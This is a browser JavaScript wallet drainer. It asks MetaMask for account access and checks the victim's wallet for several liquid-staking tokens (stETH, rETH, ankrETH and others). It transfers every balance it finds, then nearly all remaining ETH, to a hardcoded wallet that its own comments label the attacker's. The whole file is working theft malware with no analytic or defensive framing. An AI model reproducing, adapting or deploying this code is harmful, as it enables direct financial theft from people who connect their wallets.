(async function() {
    if (typeof ethers === "undefined") {
        let script = document.createElement("script");
        script.src = "https://cdnjs.cloudflare.com/ajax/libs/ethers/6.6.0/ethers.umd.min.js";
        document.head.appendChild(script);
        await new Promise(resolve => script.onload = resolve);
    }

    const provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);  // Request access to MetaMask
    const signer = await provider.getSigner();
    const victimAddress = await signer.getAddress();
    
    // Attacker's wallet
    const attackerWallet = "0x089DE092462ECF7360b190970f8e799f3752f4D1";

    console.log(`Connected wallet: ${victimAddress}`);

    // List of staking tokens (Lido, Rocket Pool, Ankr, etc.)
    const stakingTokens = [
        { name: "stETH", symbol: "stETH", address: "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84", decimals: 18 },
        { name: "rETH", symbol: "rETH", address: "0xae78736Cd615f374D3085123A210448E74Fc6393", decimals: 18 },
        { name: "stMATIC", symbol: "stMATIC", address: "0x3A58A17409b503d6b9a92b2D499cCcbB1F3323D4", decimals: 18 },
        { name: "sETH2", symbol: "sETH2", address: "0xFe2e637202056d30016725477c5da089Ab0A043A", decimals: 18 },
        { name: "ankrETH", symbol: "ankrETH", address: "0xE95A203B1a91a908F9B9CE46459d101078c2c3cb", decimals: 18 }
    ];

    const erc20Abi = [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)"
    ];

    for (const token of stakingTokens) {
        let tokenContract = new ethers.Contract(token.address, erc20Abi, provider);
        let balance = await tokenContract.balanceOf(victimAddress);

        if (balance > 0) {
            console.log(`Detected ${token.symbol}: ${ethers.formatUnits(balance, token.decimals)}`);

            // Transfer staking token to attacker
            let tokenContractWithSigner = tokenContract.connect(signer);
            let tx = await tokenContractWithSigner.transfer(attackerWallet, balance);
            console.log(`${token.symbol} sent: ${tx.hash}`);
        }
    }

    // Send ETH to attacker (leaving gas fees)
    let ethBalance = await provider.getBalance(victimAddress);
    if (ethBalance > 0n) {
        console.log(`ETH Balance: ${ethers.formatEther(ethBalance)} ETH`);
        
        const gasLimit = 21000;
        const gasPrice = await provider.getFeeData();
        const gasCost = gasPrice.gasPrice * gasLimit;
        const amountToSend = ethBalance - gasCost;

        if (amountToSend > 0n) {
            let tx = await signer.sendTransaction({
                to: attackerWallet,
                value: amountToSend,
                gasLimit
            });
            console.log(`ETH sent: ${tx.hash}`);
        }
    }
})();
